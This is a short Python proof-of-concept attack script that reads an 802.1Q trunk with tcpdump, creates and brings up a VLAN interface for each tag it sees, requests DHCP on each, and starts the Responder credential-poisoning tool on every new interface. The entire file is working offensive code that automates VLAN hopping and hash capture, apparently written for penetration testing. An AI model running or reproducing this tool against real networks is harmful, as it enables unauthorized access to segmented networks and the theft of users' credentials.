#!/usr/bin/env python
#This script will discover the vlans on an 802.1Q trunk and print them
#it will add interfaces, and do DHCP discovery, and start responder
#this is a proof of concept and this program will be refined
#only works on Linux
#needs tcpdump installed

import StringIO
import sys
import shlex
import subprocess
from string import Template

eth = "eth0"
responder = Template('./Responder/Responder.py -I $int -wr --lm')
cmd = "/usr/sbin/tcpdump -n -i eth0 -e"
args = shlex.split(cmd)
tcpdump = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
print "Press CTRL-C to stop avalanche"
output = StringIO.StringIO()
running = True
vlans = set()
while running:
    try:
        data = tcpdump.stdout.readline()
        if len(data):
	    packet = data.split()
	    if packet[5] == "802.1Q":
	#	print vlans
		vlanTag = packet[10].rstrip(',')
		if vlanTag not in vlans:
			vlans.add(vlanTag)
			print "added VLAN " + vlanTag 
			createInt = "ip link add link " + eth + " name " + eth + "." + vlanTag + " type vlan id " + vlanTag
			bringUpInt = "ifconfig " + eth + "." + vlanTag + " up"
			getIp = "dhclient " + eth + "." + vlanTag
			args = shlex.split(createInt)
			run = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
			args = shlex.split(bringUpInt)
                        run = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
			args = shlex.split(getIp)
                        run = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
			responderCmd = responder.substitute(int=eth + "." + vlanTag)
			args = shlex.split(responderCmd)
                        run = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        else:
            running = False
    except KeyboardInterrupt:
        tcpdump.kill()
        data = tcpdump.stdout.readline()
        running = False
